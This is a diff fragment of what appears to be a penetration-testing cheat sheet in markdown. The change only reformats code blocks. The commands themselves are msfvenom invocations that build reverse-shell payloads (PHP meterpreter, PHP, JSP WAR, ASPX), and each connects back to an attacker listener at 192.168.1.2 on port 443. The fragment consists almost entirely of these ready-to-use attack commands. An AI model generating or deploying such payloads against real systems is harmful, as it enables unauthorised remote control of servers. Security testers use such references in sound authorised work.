@@ -138,15 +138,21 @@
 msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
 ```
 
-  ```msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php```
+```cmd
+msfvenom -p php/reverse_php LHOST=192.168.1.2 LPORT=443 -f raw > reverse.php
+```
 
 `War`
 
-  ```msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war```
-  
+```cmd
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f war > reverse.war
+```
+
 `Aspx`
 
-  ```msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx```
+```cmd
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=443 -f aspx -o reverse.aspx
+```
 
 `Windows`
 
